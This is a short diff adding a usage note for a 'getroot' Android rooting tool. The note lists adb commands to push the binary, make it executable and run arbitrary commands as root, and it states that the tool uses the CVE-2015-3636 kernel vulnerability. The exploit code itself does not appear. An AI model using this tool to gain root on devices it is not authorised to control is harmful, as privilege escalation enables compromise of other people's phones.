@@ -1,0 +1,12 @@
+//// how to execute root command by 'getroot' ////
+
+usageF
+push 'getroot' in device, set permission, and execute 'getroot [command]'
+
+> adb push getroot /data/local/tmp
+> adb shell
+$ cd /data/local/tmp
+$ chmod 0755 getroot
+$ ./getroot "touch /data/local/tmp/foo.txt"
+
+# use CVE-2015-3636 vulnerability
